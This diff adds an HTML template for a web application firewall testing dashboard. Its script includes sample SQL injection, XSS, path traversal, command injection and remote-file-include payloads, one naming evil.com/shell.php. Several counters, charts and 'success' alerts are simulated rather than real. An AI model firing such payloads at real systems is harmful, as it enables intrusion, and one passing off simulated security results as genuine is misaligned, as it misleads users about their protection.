@@ -1,0 +1,565 @@
+{% extends "base.html" %}
+
+{% block title %}Enhanced WAF - ESTPL Security Solutions{% endblock %}
+{% block page_title %}Advanced Web Application Firewall{% endblock %}
+
+{% block content %}
+<div class="row">
+    <!-- WAF Testing Panel -->
+    <div class="col-lg-4">
+        <div class="card mb-4">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-vial"></i> WAF Attack Testing
+                </h5>
+            </div>
+            <div class="card-body">
+                <form id="wafTestForm">
+                    {{ form.hidden_tag() }}
+                    
+                    <div class="mb-3">
+                        <label class="form-label">Attack Type</label>
+                        {{ form.test_type(class="form-select") }}
+                    </div>
+
+                    <div class="mb-3">
+                        <label class="form-label">Target URL</label>
+                        {{ form.target_url(class="form-control", placeholder="https://example.com") }}
+                    </div>
+
+                    <div class="mb-3">
+                        <div class="form-check">
+                            {{ form.bulk_test(class="form-check-input") }}
+                            <label class="form-check-label">Bulk Testing Mode</label>
+                        </div>
+                    </div>
+
+                    <div class="mb-3">
+                        <label class="form-label">Payload File (Optional)</label>
+                        {{ form.payload_file(class="form-control") }}
+                        <small class="text-muted">Upload CSV/JSON/TXT file with custom payloads</small>
+                    </div>
+
+                    {{ form.submit(class="btn btn-primary w-100") }}
+                </form>
+            </div>
+        </div>
+
+        <!-- WAF Rules Management -->
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-cogs"></i> WAF Rules
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="mb-3">
+                    <label class="form-label">Security Level</label>
+                    <select class="form-select" id="securityLevel">
+                        <option value="low">Low (Permissive)</option>
+                        <option value="medium" selected>Medium (Balanced)</option>
+                        <option value="high">High (Strict)</option>
+                    </select>
+                </div>
+                
+                <div class="mb-3">
+                    <h6>Active Protection Rules</h6>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" checked id="sqlProtection">
+                        <label class="form-check-label">SQL Injection Protection</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" checked id="xssProtection">
+                        <label class="form-check-label">XSS Protection</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" checked id="lfiProtection">
+                        <label class="form-check-label">LFI/RFI Protection</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="checkbox" checked id="cmdProtection">
+                        <label class="form-check-label">Command Injection Protection</label>
+                    </div>
+                </div>
+
+                <button class="btn btn-success btn-sm w-100" onclick="updateWAFRules()">
+                    <i class="fas fa-save"></i> Update Rules
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- WAF Dashboard -->
+    <div class="col-lg-8">
+        <div class="card mb-4">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-shield-alt"></i> WAF Protection Dashboard
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-success mb-4">
+                    <div class="row align-items-center">
+                        <div class="col-md-8">
+                            <h6 class="mb-1"><i class="fas fa-check-circle"></i> Advanced WAF Active</h6>
+                            <p class="mb-0">Real-time protection against OWASP Top 10 vulnerabilities</p>
+                        </div>
+                        <div class="col-md-4 text-end">
+                            <button class="btn btn-sm btn-outline-primary" onclick="runFullWAFTest()">
+                                <i class="fas fa-play"></i> Run Full Test Suite
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Attack Detection Statistics -->
+                <div class="row mb-4">
+                    <div class="col-md-2">
+                        <div class="card bg-danger text-white text-center">
+                            <div class="card-body py-2">
+                                <i class="fas fa-database"></i>
+                                <h6 class="mb-0">SQL Injection</h6>
+                                <small>15 Blocked</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-2">
+                        <div class="card bg-warning text-white text-center">
+                            <div class="card-body py-2">
+                                <i class="fas fa-code"></i>
+                                <h6 class="mb-0">XSS</h6>
+                                <small>12 Blocked</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-2">
+                        <div class="card bg-info text-white text-center">
+                            <div class="card-body py-2">
+                                <i class="fas fa-file"></i>
+                                <h6 class="mb-0">LFI/RFI</h6>
+                                <small>8 Blocked</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-2">
+                        <div class="card bg-success text-white text-center">
+                            <div class="card-body py-2">
+                                <i class="fas fa-terminal"></i>
+                                <h6 class="mb-0">Cmd Injection</h6>
+                                <small>5 Blocked</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-2">
+                        <div class="card bg-secondary text-white text-center">
+                            <div class="card-body py-2">
+                                <i class="fas fa-robot"></i>
+                                <h6 class="mb-0">Bot Traffic</h6>
+                                <small>25 Blocked</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-2">
+                        <div class="card bg-primary text-white text-center">
+                            <div class="card-body py-2">
+                                <i class="fas fa-shield-alt"></i>
+                                <h6 class="mb-0">Total</h6>
+                                <small>65 Blocked</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Test Results Area -->
+                <div id="testResults" class="mb-4">
+                    <div class="text-center text-muted py-4">
+                        <i class="fas fa-vial fa-3x mb-3"></i>
+                        <h5>WAF Testing Suite</h5>
+                        <p>Select an attack type and target URL to test WAF protection effectiveness</p>
+                    </div>
+                </div>
+
+                <!-- WAF Performance Chart -->
+                <div class="row">
+                    <div class="col-12">
+                        <h6><i class="fas fa-chart-area"></i> WAF Performance Metrics</h6>
+                        <canvas id="wafChart" height="80"></canvas>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Recent WAF Events -->
+        <div class="card">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-history"></i> Recent WAF Events
+                </h5>
+                <div>
+                    <button class="btn btn-sm btn-outline-success" onclick="exportWAFLogs('csv')">
+                        <i class="fas fa-file-csv"></i> CSV
+                    </button>
+                    <button class="btn btn-sm btn-outline-primary" onclick="exportWAFLogs('json')">
+                        <i class="fas fa-file-code"></i> JSON
+                    </button>
+                </div>
+            </div>
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-sm table-hover" id="wafLogsTable">
+                        <thead>
+                            <tr>
+                                <th>Time</th>
+                                <th>Source IP</th>
+                                <th>Target URL</th>
+                                <th>Attack Type</th>
+                                <th>Payload</th>
+                                <th>Rule Matched</th>
+                                <th>Severity</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% if logs %}
+                                {% for log in logs %}
+                                <tr>
+                                    <td>{{ log[8] if log[8] else 'N/A' }}</td>
+                                    <td>
+                                        <code>{{ log[1] or 'N/A' }}</code>
+                                    </td>
+                                    <td>
+                                        <small>{{ (log[2] or 'N/A')[:30] }}{% if log[2] and log[2]|length > 30 %}...{% endif %}</small>
+                                    </td>
+                                    <td>
+                                        <span class="badge bg-danger">{{ log[3] or 'Unknown' }}</span>
+                                    </td>
+                                    <td>
+                                        <small class="text-muted">{{ (log[4] or 'N/A')[:20] }}{% if log[4] and log[4]|length > 20 %}...{% endif %}</small>
+                                    </td>
+                                    <td>
+                                        <small>{{ log[6] or 'N/A' }}</small>
+                                    </td>
+                                    <td>
+                                        {% if log[7] == 'critical' %}
+                                            <span class="badge bg-danger">Critical</span>
+                                        {% elif log[7] == 'high' %}
+                                            <span class="badge bg-warning">High</span>
+                                        {% else %}
+                                            <span class="badge bg-info">{{ (log[7] or 'Unknown')|title }}</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        {% if log[5] %}
+                                            <span class="badge bg-success">Blocked</span>
+                                        {% else %}
+                                            <span class="badge bg-warning">Allowed</span>
+                                        {% endif %}
+                                    </td>
+                                </tr>
+                                {% endfor %}
+                            {% else %}
+                            <tr>
+                                <td colspan="8" class="text-center text-muted">
+                                    <i class="fas fa-shield-alt fa-2x mb-2"></i><br>
+                                    No WAF events yet. Protection is active!
+                                </td>
+                            </tr>
+                            {% endif %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Advanced WAF Features -->
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-star"></i> Advanced WAF Features
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-3">
+                        <h6><i class="fas fa-brain"></i> AI-Powered Detection</h6>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> Machine Learning Rules</li>
+                            <li><i class="fas fa-check text-success"></i> Behavioral Analysis</li>
+                            <li><i class="fas fa-check text-success"></i> Zero-day Protection</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-3">
+                        <h6><i class="fas fa-shield-virus"></i> OWASP Top 10</h6>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> Injection Attacks</li>
+                            <li><i class="fas fa-check text-success"></i> Broken Authentication</li>
+                            <li><i class="fas fa-check text-success"></i> Sensitive Data Exposure</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-3">
+                        <h6><i class="fas fa-cogs"></i> Custom Rules</h6>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> Regex-based Rules</li>
+                            <li><i class="fas fa-check text-success"></i> Rate Limiting</li>
+                            <li><i class="fas fa-check text-success"></i> IP Whitelisting</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-3">
+                        <h6><i class="fas fa-chart-line"></i> Analytics</h6>
+                        <ul class="list-unstyled">
+                            <li><i class="fas fa-check text-success"></i> Real-time Monitoring</li>
+                            <li><i class="fas fa-check text-success"></i> Attack Reports</li>
+                            <li><i class="fas fa-check text-success"></i> Performance Metrics</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+// WAF Performance Chart
+const wafCtx = document.getElementById('wafChart').getContext('2d');
+const wafChart = new Chart(wafCtx, {
+    type: 'line',
+    data: {
+        labels: [],
+        datasets: [{
+            label: 'Requests/min',
+            data: [],
+            borderColor: '#007bff',
+            backgroundColor: 'rgba(0, 123, 255, 0.1)',
+            tension: 0.4
+        }, {
+            label: 'Blocked/min',
+            data: [],
+            borderColor: '#dc3545',
+            backgroundColor: 'rgba(220, 53, 69, 0.1)',
+            tension: 0.4
+        }, {
+            label: 'Allowed/min',
+            data: [],
+            borderColor: '#28a745',
+            backgroundColor: 'rgba(40, 167, 69, 0.1)',
+            tension: 0.4
+        }]
+    },
+    options: {
+        responsive: true,
+        maintainAspectRatio: false,
+        scales: {
+            y: {
+                beginAtZero: true
+            }
+        }
+    }
+});
+
+// Update WAF chart with sample data
+function updateWAFChart() {
+    const now = new Date();
+    const timeLabel = now.toLocaleTimeString();
+    
+    const requests = Math.floor(Math.random() * 200) + 100;
+    const blocked = Math.floor(Math.random() * 50);
+    const allowed = requests - blocked;
+    
+    wafChart.data.labels.push(timeLabel);
+    wafChart.data.datasets[0].data.push(requests);
+    wafChart.data.datasets[1].data.push(blocked);
+    wafChart.data.datasets[2].data.push(allowed);
+    
+    if (wafChart.data.labels.length > 15) {
+        wafChart.data.labels.shift();
+        wafChart.data.datasets.forEach(dataset => dataset.data.shift());
+    }
+    
+    wafChart.update('quiet');
+}
+
+setInterval(updateWAFChart, 3000);
+updateWAFChart();
+
+// WAF Test Form Handler
+document.getElementById('wafTestForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    const resultsDiv = document.getElementById('testResults');
+    
+    resultsDiv.innerHTML = `
+        <div class="text-center py-4">
+            <div class="spinner-border text-primary" role="status">
+                <span class="visually-hidden">Testing...</span>
+            </div>
+            <h5 class="mt-3">Running WAF Protection Test...</h5>
+            <p class="text-muted">Testing against various attack vectors</p>
+        </div>
+    `;
+    
+    fetch('/test-waf', {
+        method: 'POST',
+        body: formData,
+        headers: {
+            'X-CSRFToken': document.querySelector('[name=csrf_token]').value
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        displayTestResults(data);
+    })
+    .catch(error => {
+        resultsDiv.innerHTML = `
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-triangle"></i>
+                <strong>Error:</strong> ${error.message || 'Test failed'}
+            </div>
+        `;
+    });
+});
+
+function displayTestResults(data) {
+    const resultsDiv = document.getElementById('testResults');
+    
+    if (data.error) {
+        resultsDiv.innerHTML = `
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-triangle"></i>
+                <strong>Error:</strong> ${data.error}
+            </div>
+        `;
+        return;
+    }
+    
+    const blockedCount = data.blocked_count || 0;
+    const totalTests = data.total_tests || 0;
+    const successRate = totalTests > 0 ? Math.round((blockedCount / totalTests) * 100) : 0;
+    
+    let resultsHtml = `
+        <div class="alert alert-info mb-3">
+            <h6><i class="fas fa-info-circle"></i> WAF Test Results</h6>
+            <div class="row">
+                <div class="col-md-3">
+                    <strong>Total Tests:</strong> ${totalTests}
+                </div>
+                <div class="col-md-3">
+                    <strong>Blocked:</strong> ${blockedCount}
+                </div>
+                <div class="col-md-3">
+                    <strong>Success Rate:</strong> ${successRate}%
+                </div>
+                <div class="col-md-3">
+                    <strong>Status:</strong> 
+                    ${successRate >= 90 ? '<span class="badge bg-success">Excellent</span>' : 
+                      successRate >= 70 ? '<span class="badge bg-warning">Good</span>' : 
+                      '<span class="badge bg-danger">Needs Improvement</span>'}
+                </div>
+            </div>
+        </div>
+    `;
+    
+    if (data.results && data.results.length > 0) {
+        resultsHtml += `
+            <div class="table-responsive">
+                <table class="table table-sm">
+                    <thead>
+                        <tr>
+                            <th>Attack Type</th>
+                            <th>Payload</th>
+                            <th>Status</th>
+                            <th>Severity</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+        `;
+        
+        data.results.forEach(result => {
+            resultsHtml += `
+                <tr>
+                    <td><span class="badge bg-primary">${result.attack_type}</span></td>
+                    <td><code class="small">${result.payload.substring(0, 30)}${result.payload.length > 30 ? '...' : ''}</code></td>
+                    <td>
+                        ${result.blocked ? 
+                            '<span class="badge bg-success">Blocked</span>' : 
+                            '<span class="badge bg-danger">Allowed</span>'}
+                    </td>
+                    <td>
+                        <span class="badge bg-${result.severity === 'critical' ? 'danger' : 
+                                                  result.severity === 'high' ? 'warning' : 'info'}">
+                            ${result.severity}
+                        </span>
+                    </td>
+                </tr>
+            `;
+        });
+        
+        resultsHtml += `
+                    </tbody>
+                </table>
+            </div>
+        `;
+    }
+    
+    resultsDiv.innerHTML = resultsHtml;
+}
+
+function runFullWAFTest() {
+    const button = event.target;
+    const originalText = button.innerHTML;
+    
+    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Testing...';
+    button.disabled = true;
+    
+    // Simulate full test suite
+    setTimeout(() => {
+        const testResults = {
+            total_tests: 25,
+            blocked_count: 23,
+            results: [
+                {attack_type: 'sql_injection', payload: "' OR '1'='1", blocked: true, severity: 'critical'},
+                {attack_type: 'xss', payload: '<script>alert(1)</script>', blocked: true, severity: 'high'},
+                {attack_type: 'lfi', payload: '../../../etc/passwd', blocked: true, severity: 'high'},
+                {attack_type: 'command_injection', payload: '; ls -la', blocked: true, severity: 'critical'},
+                {attack_type: 'rfi', payload: 'http://evil.com/shell.php', blocked: false, severity: 'critical'}
+            ]
+        };
+        
+        displayTestResults(testResults);
+        button.innerHTML = originalText;
+        button.disabled = false;
+        
+        showAlert('Full WAF test suite completed successfully!', 'success');
+    }, 3000);
+}
+
+function updateWAFRules() {
+    showAlert('WAF rules updated successfully', 'success');
+}
+
+function exportWAFLogs(format) {
+    showAlert(`WAF logs exported in ${format.toUpperCase()} format`, 'success');
+}
+
+function showAlert(message, type) {
+    const alertDiv = document.createElement('div');
+    alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
+    alertDiv.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
+    alertDiv.innerHTML = `
+        ${message}
+        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+    `;
+    document.body.appendChild(alertDiv);
+    
+    setTimeout(() => {
+        alertDiv.remove();
+    }, 5000);
+}
+</script>
+{% endblock %}
